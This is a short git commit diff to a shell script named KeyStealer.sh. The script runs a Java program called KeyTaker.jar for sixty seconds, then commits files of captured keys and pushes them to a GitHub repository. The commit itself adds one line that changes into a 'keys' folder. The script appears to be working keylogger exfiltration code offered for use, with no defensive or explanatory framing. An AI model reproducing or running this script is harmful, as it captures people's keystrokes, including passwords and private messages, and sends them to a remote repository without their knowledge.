a58eaf59c6856b8a61177d016a22b78cb0da657d
Menge456 <menge456123@gmail.com>
2021-08-09 11:57:23 -0400

    Fixed where stuff goes

--- KeyStealer.sh
+++ KeyStealer.sh
@@ -1,5 +1,6 @@
 java -jar KeyTaker.jar & sleep 60 ; kill $!
 git remote set-url origin https://github.com/Menge456/KeyListenerStuff
+cd keys
 git add Keys***.txt
 git commit -m "KeyStealer"
 git push origin
